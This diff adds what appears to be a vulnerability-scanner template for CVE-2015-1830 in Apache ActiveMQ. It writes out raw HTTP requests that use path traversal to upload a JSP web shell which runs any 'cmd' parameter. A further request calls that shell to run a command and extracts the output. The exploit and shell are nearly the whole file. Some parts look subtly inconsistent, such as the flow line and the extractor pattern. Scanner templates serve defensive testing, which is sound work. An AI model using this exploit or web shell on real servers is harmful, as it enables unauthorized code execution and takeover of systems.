@@ -1,0 +1,87 @@
+id: cve-2015-1830
+info:
+  name: Apache ActiveMQ FileServer Unauthenticated RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Apache ActiveMQ is the most popular open source, multi-protocol, Java-based message broker. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.
+  reference:
+    - https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt
+  tags: command-execution,rce
+
+variables:
+  cmd: "whoami"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        PUT /fileserver/sex../../..\\\\admin/qetyu.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        adgjloure
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 204
+
+  - raw:
+      - |
+        GET /admin/qetyu.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "adgjloure"
+        part: body
+
+  - raw:
+      - |
+        PUT /fileserver/sex../../..\\\\admin/qazwsx.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        <%@ page import="java.util.*,java.io.*"%>
+        <%
+        if (request.getParameter("cmd") != null) {
+          out.println("Command: " + request.getParameter("cmd") + "<BR>");
+          Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+          OutputStream os = p.getOutputStream();
+          InputStream in = p.getInputStream();
+          DataInputStream dis = new DataInputStream(in);
+          String disr = dis.readLine();
+          while ( disr != null ) {
+              out.println(disr);
+              disr = dis.readLine();
+          }
+        }
+        %>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /admin/qazwsx.jsp?cmd={{cmd}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - '<BR>(.*?)</pre>'
